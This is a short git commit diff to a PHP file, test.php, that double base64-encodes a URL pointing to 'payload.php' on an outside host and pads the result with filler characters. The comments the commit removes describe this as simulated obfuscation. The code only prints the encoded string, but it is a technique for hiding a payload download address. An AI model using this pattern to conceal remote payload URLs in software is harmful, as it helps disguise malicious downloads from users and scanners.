7ab6c5d9784e57cc4d35d8e8937c927a0bfc1699
xy170 <ycwlgzs@gmail.com>
2026-05-23 01:23:09 +0800

    Update test.php

--- test.php
+++ test.php
@@ -2,8 +2,6 @@
 
 $inner = "http://a.xzvs.top$$http://a.xzvs.top/payload.php";
 
-// 双重 base64
 $encoded = base64_encode(base64_encode($inner));
 
-// 加 5 位前缀 + 5 位后缀（随便字符，用于模拟混淆）
 echo "AAAAA" . $encoded . "BBBBB";
